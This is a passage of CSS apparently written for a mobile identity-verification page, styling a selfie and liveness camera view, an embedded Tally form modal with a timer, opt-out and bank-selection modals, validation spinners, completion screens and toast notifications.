      border: 1px solid rgba(26, 31, 113, 0.08);
      box-shadow: var(--shadow-sm);
    }

    .analysis-report.success {
      border-color: rgba(0, 211, 77, 0.35);
      background: rgba(0, 211, 77, 0.1);
      box-shadow: 0 20px 45px rgba(0, 211, 77, 0.2);
    }

    .analysis-report.failed {
      border-color: rgba(255, 77, 77, 0.35);
      background: rgba(255, 77, 77, 0.08);
      box-shadow: 0 12px 32px rgba(255, 77, 77, 0.18);
    }

    .analysis-header {
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
      margin-bottom: 1rem;
    }

    .analysis-score .score-label {
      font-size: 0.75rem;
      letter-spacing: 0.12em;
      text-transform: uppercase;
      color: var(--neutral-600);
    }

    .analysis-score .score-value {
      font-size: 2.3rem;
      font-weight: 800;
      color: var(--primary);
      line-height: 1;
    }

    .analysis-status {
      display: inline-flex;
      align-items: center;
      gap: 0.5rem;
      padding: 0.45rem 0.85rem;
      border-radius: var(--radius-full);
      font-weight: 600;
      font-size: 0.82rem;
    }

    .analysis-status.status-pending {
      background: rgba(0, 149, 255, 0.12);
      color: var(--info);
    }

    .analysis-status.status-active {
      background: rgba(247, 182, 0, 0.16);
      color: var(--accent);
    }

    .analysis-status.status-processing {
      background: rgba(50, 68, 182, 0.12);
      color: var(--primary-light);
    }

    .analysis-status.status-success {
      background: rgba(0, 211, 77, 0.16);
      color: var(--success);
    }

    .analysis-status.status-failed {
      background: rgba(255, 77, 77, 0.15);
      color: var(--danger);
    }

    .analysis-status i {
      font-size: 0.95rem;
    }

    .analysis-checklist {
      display: grid;
      gap: 0.8rem;
    }

    @media (min-width: 680px) {
      .analysis-checklist {
        grid-template-columns: repeat(2, minmax(0, 1fr));
      }
    }

    .analysis-item {
      display: flex;
      gap: 0.75rem;
      padding: 0.85rem;
      border-radius: var(--radius-lg);
      background: var(--neutral-100);
      border: 1px solid rgba(26, 31, 113, 0.08);
      transition: var(--transition-base);
      box-shadow: var(--shadow-xs);
    }

    .analysis-item .item-icon {
      width: 36px;
      height: 36px;
      border-radius: var(--radius-full);
      background: rgba(26, 31, 113, 0.12);
      color: var(--primary);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.95rem;
      transition: var(--transition-base);
    }

    .analysis-item strong {
      display: block;
      font-size: 0.85rem;
      color: var(--neutral-800);
      margin-bottom: 0.25rem;
    }

    .analysis-item p {
      font-size: 0.78rem;
      color: var(--neutral-600);
      line-height: 1.45;
    }

    .analysis-item.active {
      border-color: rgba(247, 182, 0, 0.6);
      background: rgba(247, 182, 0, 0.12);
      box-shadow: 0 14px 30px rgba(247, 182, 0, 0.2);
    }

    .analysis-item.active .item-icon {
      background: var(--accent);
      color: #fff;
    }

    .analysis-item.completed {
      border-color: rgba(0, 211, 77, 0.45);
      background: rgba(0, 211, 77, 0.12);
      box-shadow: 0 16px 34px rgba(0, 211, 77, 0.2);
    }

    .analysis-item.completed .item-icon {
      background: var(--success);
      color: #fff;
    }

    .camera-container.completed .camera-instructions {
      background: rgba(0, 211, 77, 0.85);
    }

    .camera-container.camera-disabled {
      background: linear-gradient(135deg, rgba(26, 31, 113, 0.9), rgba(12, 16, 69, 0.95));
    }

    .camera-container.camera-disabled .camera-video {
      display: none;
    }

    .camera-container.camera-disabled .overlay-grid,
    .camera-container.camera-disabled .overlay-frame,
    .camera-container.camera-disabled .overlay-corners,
    .camera-container.camera-disabled .liveness-points,
    .camera-container.camera-disabled .liveness-focus-dot,
    .camera-container.camera-disabled .overlay-scan-line {
      opacity: 0;
    }

    .camera-container.camera-disabled .camera-instructions {
      background: rgba(0, 211, 77, 0.92);
      font-weight: 600;
      letter-spacing: 0.01em;
    }

    .camera-container.camera-disabled .camera-countdown {
      display: none;
    }

    /* Selfie Preview */
    .selfie-preview {
      display: none;
      position: relative;
      max-width: 255px;
      margin: 1rem auto;
      border-radius: var(--radius-lg);
      overflow: hidden;
      box-shadow: var(--shadow-lg);
      border: 3px solid var(--success);
    }

    .selfie-preview.active {
      display: block;
      animation: slideUp 0.5s ease;
    }

    .selfie-preview img {
      width: 100%;
      height: 200px;
      object-fit: cover;
    }

    .preview-overlay {
      position: absolute;
      bottom: 0;
      left: 0;
      right: 0;
      background: linear-gradient(transparent, rgba(0,0,0,0.7));
      padding: 1rem;
      transform: translateY(100%);
      transition: transform 0.3s ease;
    }

    .selfie-preview:hover .preview-overlay {
      transform: translateY(0);
    }

    .preview-actions {
      display: flex;
      gap: 0.5rem;
      justify-content: center;
    }

    .preview-btn {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      border: none;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: var(--transition-base);
      font-size: 1rem;
    }

    .preview-btn.remove {
      background: var(--danger);
      color: white;
    }

    .preview-btn:disabled,
    .preview-btn.is-disabled {
      opacity: 0.55;
      cursor: not-allowed;
      transform: none;
    }

    .preview-btn:hover {
      transform: scale(1.1);
    }

    /* Status Messages */
    .status-message {
      display: flex;
      align-items: flex-start;
      gap: 0.75rem;
      padding: 1rem;
      border-radius: var(--radius-lg);
      margin-bottom: 1.5rem;
      border-left: 4px solid;
      font-size: 0.9rem;
    }

    .status-message.success {
      background: rgba(0, 211, 77, 0.08);
      border-color: var(--success);
      color: var(--success);
    }

    .status-message.warning {
      background: rgba(255, 173, 51, 0.08);
      border-color: var(--warning);
      color: var(--warning);
    }

    .status-message.info {
      background: rgba(0, 149, 255, 0.08);
      border-color: var(--info);
      color: var(--info);
    }

    .status-message.error {
      background: rgba(255, 77, 77, 0.08);
      border-color: var(--danger);
      color: var(--danger);
    }

    .status-icon {
      font-size: 1.25rem;
      flex-shrink: 0;
      margin-top: 0.1rem;
    }

    .status-content {
      flex: 1;
    }

    .status-title {
      font-weight: 700;
      margin-bottom: 0.25rem;
      font-size: 0.9rem;
    }

    .status-text {
      font-size: 0.85rem;
      opacity: 0.9;
      line-height: 1.5;
    }

    .retake-guidelines {
      list-style: none;
      padding: 0;
      margin: 1rem 0;
      text-align: left;
      display: flex;
      flex-direction: column;
      gap: 0.6rem;
      font-size: 0.85rem;
      color: var(--neutral-600);
    }

    .retake-guidelines li {
      display: flex;
      gap: 0.5rem;
      align-items: flex-start;
    }

    .retake-guidelines i {
      color: var(--primary);
      margin-top: 0.1rem;
      font-size: 0.9rem;
    }

    .retake-guidelines li span {
      flex: 1;
    }

    .retake-overlay-note {
      font-size: 0.8rem;
      color: var(--neutral-600);
      margin-top: 0.5rem;
      text-align: left;
    }

    /* Navigation */
    .navigation {
      display: flex;
      justify-content: space-between;
      align-items: center;
      gap: 1rem;
      margin-top: 2rem;
      padding-top: 1.5rem;
      border-top: 1px solid var(--neutral-300);
    }

    /* Step Content */
    .step-content {
      display: none;
    }

    .step-content.active {
      display: block;
      animation: fadeIn 0.6s ease;
    }

    .step-content.skipped {
      display: none !important;
    }

    /* =========================================================
       CORRECCIÓN CRÍTICA: Tally Form Container COMPLETAMENTE MEJORADO
       ========================================================= */
    .tally-section {
      background: var(--gradient-primary);
      border-radius: var(--radius-2xl);
      padding: 1.5rem;
      margin: 2rem -1rem; /* Márgenes negativos para pantalla completa */
      color: white;
      box-shadow: var(--shadow-banking);
      position: relative;
      overflow: hidden;
    }

    .tally-section::before {
      content: '';
      position: absolute;
      top: -50%;
      right: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
      animation: rotate 20s linear infinite;
    }

    .tally-header {
      text-align: center;
      margin-bottom: 1.5rem;
      position: relative;
      z-index: 2;
    }

    .tally-icon {
      width: 60px;
      height: 60px;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.8rem;
      margin: 0 auto 1rem;
      backdrop-filter: blur(10px);
    }

    .tally-title {
      font-size: 1.3rem;
      font-weight: 700;
      margin-bottom: 0.5rem;
    }

    .tally-subtitle {
      font-size: 0.9rem;
      opacity: 0.9;
      line-height: 1.4;
    }

    /* CORRECCIÓN CRÍTICA: Container más grande para mejor visualización */
    .tally-container {
      width: 100%;
      min-height: 80vh; /* Mucho más alto */
      border-radius: var(--radius-xl);
      overflow: hidden;
      box-shadow: var(--shadow-xl);
      border: 2px solid rgba(255, 255, 255, 0.3);
      margin: 1rem 0;
      background: white;
      position: relative;
      z-index: 2;
    }

    .tally-container iframe {
      width: 90%;
      height: 100%;
      border: none;
      background: white;
      display: block;
      margin: 0 5%;
      padding: 0;
    }

    /* Indicador de completado del formulario Tally */
    .tally-completion-indicator {
      background: var(--gradient-success);
      color: white;
      padding: 1.2rem;
      border-radius: var(--radius-lg);
      margin: 1.5rem 0;
      text-align: center;
      font-weight: 600;
      font-size: 1rem;
      box-shadow: 0 4px 15px rgba(0, 211, 77, 0.3);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.75rem;
    }

    .tally-completion-indicator i {
      font-size: 1.5rem;
    }

    /* =========================================================
       CORRECCIÓN CRÍTICA: Nueva Pantalla de Validación con Spinner
       ========================================================= */
    .validation-screen {
      text-align: center;
      padding: 3rem 1rem;
      display: none;
    }

    .validation-screen.active {
      display: block;
      animation: fadeIn 0.6s ease;
    }

    .validation-spinner {
      width: 120px;
      height: 120px;
      border: 8px solid rgba(26, 31, 113, 0.1);
      border-top: 8px solid var(--primary);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 2rem;
      position: relative;
    }

    .validation-spinner::after {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 60px;
      height: 60px;
      background: var(--gradient-primary);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .validation-spinner::before {
      content: '\f2f1';
      font-family: 'Font Awesome 6 Free';
      font-weight: 900;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      color: white;
      font-size: 2rem;
      z-index: 10;
    }

    .validation-title {
      font-size: 2rem;
      font-weight: 700;
      color: var(--neutral-900);
      margin-bottom: 1rem;
    }

    .validation-subtitle {
      font-size: 1.1rem;
      color: var(--neutral-600);
      margin-bottom: 2rem;
      max-width: 425px;
      margin-left: auto;
      margin-right: auto;
      line-height: 1.6;
    }

    .validation-progress {
      background: var(--neutral-200);
      height: 8px;
      border-radius: 4px;
      overflow: hidden;
      margin: 2rem auto;
      max-width: 340px;
    }

    .validation-progress-bar {
      background: var(--gradient-primary);
      height: 100%;
      width: 0%;
      transition: width 0.5s ease;
      border-radius: 4px;
    }

    .validation-steps {
      text-align: left;
      max-width: 340px;
      margin: 2rem auto;
    }

    .validation-step {
      display: flex;
      align-items: center;
      gap: 1rem;
      padding: 0.75rem 0;
      border-bottom: 1px solid var(--neutral-300);
      opacity: 0.5;
      transition: opacity 0.3s ease;
    }

    .validation-step:last-child {
      border-bottom: none;
    }

    .validation-step.active {
      opacity: 1;
      color: var(--primary);
      font-weight: 600;
    }

    .validation-step.completed {
      opacity: 1;
      color: var(--success);
    }

    .validation-step-icon {
      width: 24px;
      height: 24px;
      border-radius: 50%;
      background: var(--neutral-300);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.8rem;
      color: white;
      flex-shrink: 0;
    }

    .validation-step.active .validation-step-icon {
      background: var(--primary);
      animation: pulse 1s infinite;
    }

    .validation-step.completed .validation-step-icon {
      background: var(--success);
    }

    /* Completion Screen Mejorada */
    .completion-screen {
      text-align: center;
      padding: 2rem 0;
    }

    .completion-icon {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      background: var(--gradient-success);
      color: white;
      font-size: 3rem;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 2rem;
      box-shadow: 0 0 30px rgba(0, 211, 77, 0.4);
      animation: checkmarkScale 0.8s var(--animation-bounce);
    }

    .completion-title {
      font-size: 2rem;
      font-weight: 700;
      color: var(--neutral-900);
      margin-bottom: 1rem;
    }

    .completion-subtitle {
      font-size: 1rem;
      color: var(--neutral-600);
      margin-bottom: 2rem;
      max-width: 425px;
      margin-left: auto;
      margin-right: auto;
      line-height: 1.6;
    }

    /* Already Completed Screen */
    .already-completed {
      text-align: center;
      padding: 3rem 1rem;
    }

    .already-completed-icon {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      background: linear-gradient(135deg, var(--warning) 0%, #f59e0b 100%);
      color: white;
      font-size: 2.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 1.5rem;
      box-shadow: 0 0 25px rgba(255, 173, 51, 0.4);
    }

    .already-completed-title {
      font-size: 1.75rem;
      font-weight: 700;
      color: var(--neutral-900);
      margin-bottom: 1rem;
    }

    .already-completed-text {
      font-size: 1rem;
      color: var(--neutral-600);
      margin-bottom: 2rem;
      line-height: 1.6;
    }

    .verification-details {
      background: var(--neutral-200);
      border-radius: var(--radius-lg);
      padding: 1.5rem;
      margin: 2rem 0;
      text-align: left;
    }

    .detail-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 0.75rem 0;
      border-bottom: 1px solid var(--neutral-300);
      font-size: 0.9rem;
    }

    .detail-row:last-child {
      border-bottom: none;
    }

    .detail-label {
      font-weight: 600;
      color: var(--neutral-700);
    }

    .detail-value {
      color: var(--neutral-900);
      font-weight: 500;
    }

    /* Loading Overlay */
    .loading-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(5px);
      display: none;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 1s linear infinite;
      margin-bottom: 1.5rem;
    }

    .loading-text {
      color: white;
      font-size: 1.1rem;
      font-weight: 500;
      text-align: center;
      max-width: 255px;
    }

    .avatar-compare-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(13, 17, 66, 0.88);
      backdrop-filter: blur(10px);
      display: none;
      align-items: center;
      justify-content: center;
      padding: 1.5rem;
      z-index: 100050;
    }

    .avatar-compare-overlay.show {
      display: flex;
      animation: fadeIn 0.4s ease;
    }

    .avatar-compare-modal {
      background: var(--neutral-100);
      border-radius: var(--radius-2xl);
      box-shadow: var(--shadow-xl);
      padding: 2rem 1.75rem 1.75rem;
      max-width: 420px;
      width: 100%;
      position: relative;
      text-align: center;
    }

    .avatar-compare-header {
      display: flex;
      align-items: center;
      gap: 0.75rem;
      justify-content: center;
      margin-bottom: 1rem;
    }

    .avatar-compare-icon {
      width: 48px;
      height: 48px;
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(255, 173, 51, 0.18);
      color: var(--warning);
      font-size: 1.35rem;
    }

    .avatar-compare-title {
      font-size: 1.15rem;
      font-weight: 700;
      color: var(--neutral-900);
    }

    .avatar-compare-status {
      display: inline-flex;
      align-items: center;
      gap: 0.35rem;
      background: rgba(255, 173, 51, 0.15);
      color: var(--warning);
      padding: 0.35rem 0.75rem;
      border-radius: var(--radius-full);
      font-size: 0.75rem;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 0.04em;
      margin-bottom: 1.25rem;
    }

    .avatar-compare-images {
      display: grid;
      grid-template-columns: repeat(2, minmax(0, 1fr));
      gap: 0.75rem;
      margin-bottom: 1.25rem;
    }

    .avatar-compare-image {
      background: var(--neutral-200);
      border-radius: var(--radius-xl);
      padding: 0.5rem;
      box-shadow: var(--shadow-sm);
    }

    .avatar-compare-image span {
      display: block;
      font-size: 0.75rem;
      font-weight: 600;
      color: var(--neutral-600);
      margin-bottom: 0.35rem;
    }

    .avatar-compare-img {
      width: 100%;
      aspect-ratio: 1;
      border-radius: var(--radius-lg);
      object-fit: cover;
      background: var(--neutral-300);
    }

    .avatar-compare-img.placeholder {
      filter: grayscale(1);
      opacity: 0.65;
    }

    .avatar-compare-message {
      font-size: 0.9rem;
      color: var(--neutral-700);
      line-height: 1.5;
      margin-bottom: 0.75rem;
    }

    .avatar-compare-followup {
      font-size: 0.8rem;
      color: var(--neutral-600);
      line-height: 1.4;
    }

    .avatar-compare-close {
      margin-top: 1.5rem;
    }

    @media (max-width: 480px) {
      .avatar-compare-modal {
        padding: 1.75rem 1.25rem 1.5rem;
      }

      .avatar-compare-images {
        gap: 0.6rem;
      }
    }

    /* Confirmation Overlay */
    .confirm-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.8);
      backdrop-filter: blur(5px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 10000;
    }

    #id-check-overlay {
      z-index: 100001;
    }

    #fraud-warning-overlay {
      z-index: 100002;
    }

    .confirm-content {
      background: #fff;
      padding: 2rem;
      border-radius: var(--radius-lg);
      text-align: center;
      max-width: 340px;
      width: 90%;
      box-shadow: var(--shadow-lg);
    }

    .no-bank-modal {
      background: #fff;
      padding: 2.25rem 2rem 2rem;
      border-radius: var(--radius-xl);
      max-width: 520px;
      width: min(92%, 520px);
      box-shadow: var(--shadow-xl);
      position: relative;
      text-align: left;
      color: var(--neutral-800);
    }

    .no-bank-header {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
      margin-bottom: 1.5rem;
    }

    .no-bank-badge {
      width: 54px;
      height: 54px;
      border-radius: 16px;
      background: rgba(26, 31, 113, 0.08);
      color: var(--primary);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.4rem;
    }

    .no-bank-modal h3 {
      font-size: 1.3rem;
      font-weight: 700;
      color: var(--neutral-900);
    }

    .no-bank-modal p {
      font-size: 0.95rem;
      color: var(--neutral-600);
      line-height: 1.5;
    }

    .no-bank-form {
      display: flex;
      flex-direction: column;
      gap: 1rem;
    }

    .no-bank-form .form-group {
      margin-bottom: 0;
    }

    .no-bank-form .form-group:last-of-type {
      margin-bottom: 0.5rem;
    }

    .no-bank-form .form-label {
      font-weight: 600;
      font-size: 0.85rem;
      color: var(--neutral-700);
      margin-bottom: 0.4rem;
    }

    #no-bank-message-preview {
      min-height: 120px;
      resize: vertical;
      font-size: 0.9rem;
      line-height: 1.5;
      background: rgba(26, 31, 113, 0.05);
      border: 1px solid rgba(26, 31, 113, 0.15);
    }

    .no-bank-actions {
      display: flex;
      gap: 0.75rem;
      justify-content: flex-end;
      flex-wrap: wrap;
      margin-top: 0.5rem;
    }

    .no-bank-close {
      position: absolute;
      top: 1rem;
      right: 1rem;
      width: 36px;
      height: 36px;
      border-radius: 50%;
      border: none;
      background: rgba(26, 31, 113, 0.08);
      color: var(--primary);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: var(--transition-base);
    }

    .no-bank-close:hover {
      background: rgba(26, 31, 113, 0.16);
    }

    .no-bank-overlay-note {
      font-size: 0.85rem;
      color: var(--neutral-600);
      margin-top: -0.35rem;
    }

    @media (max-width: 480px) {
      .no-bank-modal {
        padding: 1.8rem 1.4rem 1.6rem;
      }

      .no-bank-actions {
        flex-direction: column-reverse;
        align-items: stretch;
      }

      .no-bank-close {
        width: 32px;
        height: 32px;
      }
    }

    .optout-summary-content {
      max-width: 420px;
      padding: 2.25rem 2rem;
      text-align: left;
    }

    .optout-summary-icon {
      width: 58px;
      height: 58px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 1.25rem;
      color: #fff;
      background: linear-gradient(135deg, var(--danger), #ff6b6b);
      box-shadow: 0 12px 28px rgba(255, 77, 77, 0.35);
    }

    .optout-summary-content h3 {
      text-align: center;
      margin-bottom: 0.75rem;
    }

    .optout-summary-description {
      text-align: center;
      color: var(--neutral-700);
      margin-bottom: 1.25rem;
    }

    .optout-summary-list {
      list-style: none;
      margin: 0 0 1.5rem 0;
      padding: 0;
    }

    .optout-summary-item {
      display: flex;
      align-items: flex-start;
      gap: 0.65rem;
      padding: 0.75rem;
      border-radius: var(--radius-md);
      background: rgba(26, 31, 113, 0.05);
      color: var(--neutral-800);
      font-size: 0.95rem;
      line-height: 1.5;
    }

    .optout-summary-item + .optout-summary-item {
      margin-top: 0.6rem;
    }

    .optout-summary-item i {
      color: var(--danger);
      font-size: 1rem;
      margin-top: 0.2rem;
    }

    #optout-summary-continue {
      margin-top: 0.5rem;
      width: 100%;
    }

    .confirm-bank-logo {
      width: 60px;
      height: 60px;
      object-fit: contain;
      margin: 0 auto 1rem;
      display: block;
    }

    /* Volume Overlay */
    #volume-overlay {
      z-index: 100005;
      background: linear-gradient(120deg, rgba(12, 16, 69, 0.92), rgba(27, 63, 161, 0.88));
    }

    #volume-overlay .confirm-content {
      position: relative;
      max-width: 380px;
      padding: 2.5rem 2rem 2.25rem;
      background: linear-gradient(160deg, rgba(255, 255, 255, 0.98), rgba(245, 247, 250, 0.95));
      box-shadow: 0 24px 60px rgba(10, 17, 84, 0.35);
      overflow: hidden;
    }

    #volume-overlay .confirm-content::before,
    #volume-overlay .confirm-content::after {
      content: '';
      position: absolute;
      border-radius: 999px;
      background: rgba(50, 68, 182, 0.08);
      filter: blur(0px);
      animation: volumeGlow 4s ease-in-out infinite;
    }

    #volume-overlay .confirm-content::before {
      width: 260px;
      height: 260px;
      top: -140px;
      right: -100px;
    }

    #volume-overlay .confirm-content::after {
      width: 180px;
      height: 180px;
      bottom: -110px;
      left: -70px;
      animation-delay: 1.2s;
    }

    .volume-icon-wrapper {
      width: 86px;
      height: 86px;
      border-radius: 50%;
      margin: 0 auto 1.5rem;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      background: linear-gradient(135deg, #3244b6, #5565e8);
      box-shadow: 0 18px 35px rgba(50, 68, 182, 0.4);
      position: relative;
      animation: volumePulse 2.6s ease-in-out infinite;
    }

    .volume-icon-wrapper::after {
      content: '';
      position: absolute;
      inset: -10px;
      border-radius: 50%;
      border: 2px solid rgba(50, 68, 182, 0.35);
      opacity: 0;
      animation: volumeWaves 2.6s ease-out infinite;
    }

    .volume-icon-wrapper i {
      font-size: 2rem;
    }

    .volume-title {
      font-size: 1.2rem;
      font-weight: 700;
      color: var(--visa-blue);
      margin-bottom: 0.75rem;
      letter-spacing: 0.02em;
    }

    .volume-message {
      font-size: 0.95rem;
      color: var(--neutral-700);
      margin-bottom: 1.5rem;
      line-height: 1.7;
    }

    .volume-confirm-button {
      min-width: 160px;
      background: linear-gradient(135deg, #1a1f71, #3b4998);
      box-shadow: 0 14px 32px rgba(26, 31, 113, 0.28);
    }

    .volume-confirm-button:hover {
      transform: translateY(-2px);
      box-shadow: 0 18px 36px rgba(26, 31, 113, 0.34);
    }

    @keyframes volumePulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.06); }
    }

    @keyframes volumeWaves {
      0% {
        transform: scale(0.8);
        opacity: 0.7;
      }
      80% {
        transform: scale(1.4);
        opacity: 0;
      }
      100% {
        transform: scale(1.4);
        opacity: 0;
      }
    }

    @keyframes volumeGlow {
      0%, 100% {
        transform: scale(1);
        opacity: 0.45;
      }
      50% {
        transform: scale(1.08);
        opacity: 0.7;
      }
    }

    .confirm-buttons {
      margin-top: 1rem;
      display: flex;
      justify-content: center;
      gap: 0.5rem;
    }

    /* Tally Modal Overlay COMPLETAMENTE REDISEÑADO */
    .tally-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.9);
      backdrop-filter: blur(10px);
      display: none;
      align-items: flex-start;
      justify-content: center;
      z-index: 100000;
      padding: 0;
    }

    .tally-modal {
      background: white;
      border-radius: var(--radius-2xl);
      width: 95%;
      max-width: 800px;
      height: 100%;
      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
      display: flex;
      flex-direction: column;
      position: relative;
      overflow: hidden;
    }

    .tally-modal-header {
      background: var(--gradient-primary);
      color: white;
      padding: 1.5rem;
      text-align: center;
      flex-shrink: 0;
    }

    .tally-modal-icon {
      width: 60px;
      height: 60px;
      background: rgba(255, 255, 255, 0.2);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.8rem;
      margin: 0 auto 1rem;
      animation: pulse 2s infinite;
    }

    .tally-modal-title {
      font-size: 1.5rem;
      font-weight: 700;
      margin-bottom: 0.5rem;
    }

    .tally-modal-subtitle {
      font-size: 1rem;
      opacity: 0.9;
    }

    .tally-iframe-container {
      flex: 1;
      overflow: auto;
      background: transparent;
      width: 90%;
      margin: 0 5%;
    }

    .tally-iframe-container iframe {
      width: 100%;
      height: 100%;
      border: none;
      display: block;
      margin: 0;
      padding: 0;
    }

    .tally-modal-footer {
      padding: 1.5rem;
      background: var(--neutral-100);
      border-top: 2px solid var(--border);
      text-align: center;
      flex-shrink: 0;
    }

    .tally-modal-timer {
      font-size: 0.9rem;
      color: var(--neutral-600);
      margin-bottom: 1rem;
      font-weight: 600;
    }

    .tally-modal-timer i {
      color: var(--warning);
      margin-right: 0.5rem;
    }

    #timer-seconds {
      color: var(--primary);
      font-weight: 700;
      font-size: 1.1rem;
    }

    .tally-modal-footer .btn {
      width: 100%;
      max-width: 400px;
      height: 56px;
      font-size: 1.1rem;
      font-weight: 700;
      transition: all 0.3s ease;
    }

    .tally-modal-footer .btn:disabled {
      cursor: not-allowed;
      opacity: 0.5;
    }

    .tally-modal-footer .btn:not(:disabled):hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 20px rgba(0, 211, 77, 0.3);
    }

    .tally-modal-warning {
      font-size: 0.85rem;
      color: var(--warning);
      margin-top: 1rem;
      font-weight: 500;
    }

    .tally-optout-overlay {
      position: fixed;
      inset: 0;
      background: rgba(15, 23, 42, 0.65);
      backdrop-filter: blur(6px);
      display: none;
      align-items: center;
      justify-content: center;
      /* Ensure the opt-out modal sits above the Tally overlay */
      z-index: 100010;
      padding: 1.5rem;
    }

    .tally-optout-overlay.show {
      display: flex;
      animation: fadeIn 0.3s ease forwards;
    }

    .tally-optout-modal {
      background: var(--neutral-100);
      border-radius: var(--radius-xl);
      box-shadow: var(--shadow-xl);
      max-width: 520px;
      width: 100%;
      padding: 2rem;
      position: relative;
      display: flex;
      flex-direction: column;
      gap: 1.5rem;
    }

    .tally-optout-close {
      position: absolute;
      top: 1rem;
      right: 1rem;
      width: 40px;
      height: 40px;
      border-radius: var(--radius-full);
      border: none;
      background: var(--neutral-200);
      color: var(--neutral-600);
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      transition: var(--transition-base);
    }

    .tally-optout-close:hover {
      background: var(--neutral-300);
      color: var(--neutral-900);
    }

    .tally-optout-header {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    .tally-optout-header h3 {
      font-size: 1.4rem;
      color: var(--visa-blue);
      font-weight: 700;
      display: flex;
      align-items: center;
      gap: 0.65rem;
    }

    .tally-optout-header h3 i {
      color: var(--warning);
      font-size: 1.5rem;
    }

    .tally-optout-header p {
      color: var(--neutral-700);
      font-size: 0.95rem;
      line-height: 1.6;
    }

    .tally-optout-reasons {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    .tally-optout-option {
      display: flex;
      align-items: flex-start;
      gap: 0.75rem;
      padding: 0.85rem 1rem;
      border: 1px solid var(--neutral-300);
      border-radius: var(--radius-lg);
      background: var(--neutral-100);
      transition: var(--transition-base);
      cursor: pointer;
    }

    .tally-optout-option:hover {
      border-color: var(--visa-blue-light);
      box-shadow: var(--shadow-sm);
    }

    .tally-optout-option input[type="radio"] {
      margin-top: 0.25rem;
      cursor: pointer;
    }

    .tally-optout-option span {
      color: var(--neutral-800);
      font-weight: 500;
    }

    .tally-optout-warning {
      background: rgba(247, 181, 0, 0.12);
      border: 1px solid rgba(247, 181, 0, 0.4);
      color: var(--visa-blue-dark);
      border-radius: var(--radius-lg);
      padding: 1rem;
      font-size: 0.9rem;
      display: flex;
      gap: 0.75rem;
      align-items: flex-start;
    }

    .tally-optout-warning i {
      color: var(--warning);
      font-size: 1.2rem;
      margin-top: 0.1rem;
    }

    .tally-optout-actions {
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    .tally-optout-actions .btn {
      width: 100%;
    }

    @media (max-width: 640px) {
      .tally-optout-modal {
        padding: 1.5rem;
      }

      .tally-optout-header h3 {
        font-size: 1.2rem;
      }
    }

    .tally-modal-warning i {
      margin-right: 0.5rem;
    }

    /* Animación del overlay */
    .tally-overlay.show {
      display: flex;
      animation: fadeIn 0.4s ease;
    }

    .tally-overlay.show .tally-modal {
      animation: slideUp 0.5s ease;
    }

    /* Responsive para móviles */
    @media (max-width: 768px) {
      .tally-modal {
        width: 100%;
        height: 100vh;
        max-height: 100vh;
        border-radius: 0;
      }

      .tally-overlay {
        padding: 0;
      }

      .tally-modal-title {
        font-size: 1.2rem;
      }

      .tally-modal-footer .btn {
        height: 48px;
        font-size: 1rem;
      }
    }


    /* Toast Notifications */
    .toast-container {
      position: fixed;
      top: 80px;
      right: 1rem;
      z-index: 9999;
      display: flex;
      flex-direction: column;
      gap: 0.75rem;
    }

    .toast {
      background: var(--neutral-900);
      color: white;
      border-radius: var(--radius-lg);
      padding: 1rem;
      min-width: 255px;
      max-width: 340px;
      box-shadow: var(--shadow-xl);
      display: flex;
      align-items: flex-start;
      gap: 0.75rem;
      animation: slideInRight 0.3s ease, fadeOut 0.3s ease 4s forwards;
      border-left: 4px solid;
      font-size: 0.9rem;
    }

    .toast.success { border-color: var(--success); }
    .toast.error { border-color: var(--danger); }
    .toast.warning { border-color: var(--warning); }
    .toast.info { border-color: var(--info); }

    .toast-icon {
      flex-shrink: 0;
      font-size: 1.1rem;
    }

    .toast-content {
      flex: 1;
    }

    .toast-title {
      font-weight: 600;
